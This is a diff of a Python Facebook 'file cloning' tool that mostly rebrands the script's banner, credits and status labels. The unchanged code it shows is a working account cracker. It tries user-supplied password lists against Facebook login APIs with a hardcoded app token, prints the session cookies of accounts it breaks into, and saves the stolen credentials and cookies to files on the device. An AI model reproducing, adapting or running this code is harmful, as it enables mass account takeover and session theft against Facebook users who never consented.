@@ -19,7 +19,7 @@ try:
 except ModuleNotFoundError:
         print('\n Installing missing modules ...')
         os.system('pip install requests futures==2 > /dev/null')
-        os.system('python Nexus.py')
+        os.system('python Hats.py')
         
 
     
@@ -97,16 +97,18 @@ def ua_api():
 
 #__________________| LOGO |__________________#
 logo=(f"""
- \033[1;32m     _|                  
-\033[1;32m    |     __|  _ \   _ \ 
-\033[1;32m    __|  |     __\ _\
-\033[1;32m    |   |      _   _                                                                                   
+  \033[1;32m _  _______  ____  ______
+ \033[1;32m     / |/ / __/ |/_/ / / / __/
+   \033[1;32m  /    / _/_>  </ /_/ /\ \  
+ \033[1;32m  /_/|_/___/_/|_|\____/___/   
+                                                      
+
 \x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
-\033[1;32m[\033[1;31m✓\033[1;32m] Author     : Bikash × Samir
-\033[1;32m[\033[1;31m✓\033[1;32m] GitHub     : https://github.com/HiroshiYTz
-\033[1;32m[\033[1;31m✓\033[1;32m] Facebook.  : CHRISTIAN JAKE D BEBAT
-\033[1;32m[\033[1;31m✓\033[1;32m] Tool Types : \033[1;33mFile × Random
+\033[1;32m[\033[1;31m✓\033[1;32m] Author     : Chrïstîán
+\033[1;32m[\033[1;31m✓\033[1;32m] GitHub     : https://github.com/Nexus
+\033[1;32m[\033[1;31m✓\033[1;32m] Facebook.  : Simón Trinidad
+\033[1;32m[\033[1;31m✓\033[1;32m] Tool Types : \033[1;33mFile Cloning
 \033[1;32m[\033[1;31m✓\033[1;32m] VERSION    : \033[1;35m0.1
 \x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
 #__________________| MAIN |__________________#
@@ -486,7 +488,7 @@ def ク克隆():
             )
         )
         for I in range(C):
-            A.append(input(f"{green}  [›] PASSWORD #{I+1}:{dark_gray} "))
+            A.append(input(f"{red}  [›] PASSWORD #{I+1}:{dark_gray} "))
     with ThreadPool(max_workers=None) as J:
         prnt(
             pnl(
@@ -524,7 +526,7 @@ def ク克隆():
 def api2(ids,names,passlist):
         try:
                 global oks,loop,sim_id
-                sys.stdout.write(f'\r\r{G}[{R}NEXUS-M2{G}]{G} %s {G}|{G} OK{G}|{G}CP{G} %s{G}|{R}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
+                sys.stdout.write(f'\r\r{G}[{R}Nexus-M2{G}]{G} %s {G}|{G} OK{G}|{G}CP{G} %s{G}|{R}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
                 fn = names.split(' ')[0]
                 try:
                         ln = names.split(' ')[1]
@@ -605,16 +607,16 @@ def api2(ids,names,passlist):
                         url = 'https://b-api.facebook.com/method/auth.login'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
-                                        print(f'\r\r{G}[{G}NEXUS-OK{G}]{G} '+ids+f' | '+pas+'\033[1;97m')
+                                        print(f'\r\r{G}[{G}Nexus-OK{G}]{G} '+ids+f' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         print(f"\r\r{G}[{G}COOKIE{G}]>{A} "+coki)
-                                        open('/sdcard/NEXUS-FILE-M2-OK.txt', 'a').write(ids+' | '+pas+' |-> '+coki+"\n")
+                                        open('/sdcard/Nexus-FILE-M2-OK.txt', 'a').write(ids+' | '+pas+' |-> '+coki+"\n")
                                         oks.append(ids)
                                         break
                         elif 'www.facebook.com' in po['error']['message']:
                                         if 'y' in pcp:
-                                                print(f'\r\r{G}[{Y}NEXUS-CP{G}]{Y} '+ids+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/NEXUS-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                print(f'\r\r{G}[{Y}Nexus-CP{G}]{Y} '+ids+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/Nexus-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 cps.append(ids)
                                                 break
                                         else:
@@ -628,7 +630,7 @@ def api2(ids,names,passlist):
 def rndm1(uid,passlist):
         global loop
         global oks
-        sys.stdout.write(f'\r\r{G}[{R}NEXUS-M1{G}]{G} %s {G}|{G} OK{G}|{G}CP{G} %s{G}|{R}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
+        sys.stdout.write(f'\r\r{G}[{R}Nexus-M1{G}]{G} %s {G}|{G} OK{G}|{G}CP{G} %s{G}|{R}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
         try:
                 for pas in passlist:
                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
@@ -706,16 +708,16 @@ def rndm1(uid,passlist):
                         url = 'https://b-graph.facebook.com/auth/login'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
-                                        print(f'\r\r{G}[{G}HATS-OK{G}]{G} '+uid+f' | '+pas+'\033[1;97m')
+                                        print(f'\r\r{G}[{G}Nexus-OK{G}]{G} '+uid+f' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         print(f"\r\r{G}[{G}COOKIE{G}]>{A} "+coki)
-                                        open('/sdcard/NEXUS-RANDOM-M1-OK.txt', 'a').write(uid+' | '+pas+' |-> '+coki+"\n")
+                                        open('/sdcard/Nexus-RANDOM-M1-OK.txt', 'a').write(uid+' | '+pas+' |-> '+coki+"\n")
                                         oks.append(uid)
                                         break
                         elif 'www.facebook.com' in po['error']['message']:
                                         if 'y' in pcp:
-                                                print(f'\r\r{G}[{Y}HATS-CP{G}]{Y} '+uid+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/NEXUS-CP.txt','a').write(uid+'|'+pas+'\n')
+                                                print(f'\r\r{G}[{Y}Nexus-CP{G}]{Y} '+uid+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/Nexus-CP.txt','a').write(uid+'|'+pas+'\n')
                                                 cps.append(uid)
                                                 break
                                         else:
@@ -729,7 +731,7 @@ def rndm1(uid,passlist):
 def rndm2(uid,passlist):
         global loop
         global oks
-        sys.stdout.write(f'\r\r{G}[{R}NEXUS-M2{G}]{G} %s {G}|{G} OK{G}|{G}CP{G} %s{G}|{R}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
+        sys.stdout.write(f'\r\r{G}[{R}Nexus-M2{G}]{G} %s {G}|{G} OK{G}|{G}CP{G} %s{G}|{R}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
         try:
                 for pas in passlist:
                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
@@ -805,16 +807,16 @@ def rndm2(uid,passlist):
                         url = 'https://b-graph.facebook.com/auth/login'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
-                                        print(f'\r\r{G}[{G}XEN-OK{G}]{G} '+uid+f' | '+pas+'\033[1;97m')
+                                        print(f'\r\r{G}[{G}HATS-OK{G}]{G} '+uid+f' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         print(f"\r\r{G}[{G}COOKIE{G}]>{A} "+coki)
-                                        open('/sdcard/XEN-RANDOM-M1-OK.txt', 'a').write(uid+' | '+pas+' |-> '+coki+"\n")
+                                        open('/sdcard/NexusS-RANDOM-M1-OK.txt', 'a').write(uid+' | '+pas+' |-> '+coki+"\n")
                                         oks.append(uid)
                                         break
                         elif 'www.facebook.com' in po['error']['message']:
                                         if 'y' in pcp:
-                                                print(f'\r\r{G}[{XEN-CP{G}]{Y} '+uid+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/XEN-CP.txt','a').write(uid+'|'+pas+'\n')
+                                                print(f'\r\r{G}[{Y}Nexus-CP{G}]{Y} '+uid+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/Nexus-CP.txt','a').write(uid+'|'+pas+'\n')
                                                 cps.append(uid)
                                                 break
                                         else:
@@ -828,7 +830,7 @@ def rndm2(uid,passlist):
 def rndm3(uid,passlist):
         global loop
         global oks
-        sys.stdout.write(f'\r\r{G}[{R}XEN-M3{G}]{G} %s {G}|{G} OK{G}|{G}CP{G} %s{G}|{R}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
+        sys.stdout.write(f'\r\r{G}[{R}Nexus-M3{G}]{G} %s {G}|{G} OK{G}|{G}CP{G} %s{G}|{R}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
         try:
                 for pas in passlist:
                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
@@ -904,16 +906,16 @@ def rndm3(uid,passlist):
                         url = 'https://b-graph.facebook.com/auth/login'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
-                                        print(f'\r\r{G}[{G}XEN-OK{G}]{G} '+uid+f' | '+pas+'\033[1;97m')
+                                        print(f'\r\r{G}[{G}Nexus-OK{G}]{G} '+uid+f' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         print(f"\r\r{G}[{G}COOKIE{G}]>{A} "+coki)
-                                        open('/sdcard/XEN-RANDOM-M1-OK.txt', 'a').write(uid+' | '+pas+' |-> '+coki+"\n")
+                                        open('/sdcard/Nexus-RANDOM-M1-OK.txt', 'a').write(uid+' | '+pas+' |-> '+coki+"\n")
                                         oks.append(uid)
                                         break
                         elif 'www.facebook.com' in po['error']['message']:
                                         if 'y' in pcp:
-                                                print(f'\r\r{G}[{Y}XEN-CP{G}]{Y} '+uid+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/XEN-CP.txt','a').write(uid+'|'+pas+'\n')
+                                                print(f'\r\r{G}[{Y}Nexus-CP{G}]{Y} '+uid+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/Nexus-CP.txt','a').write(uid+'|'+pas+'\n')
                                                 cps.append(uid)
                                                 break
                                         else:
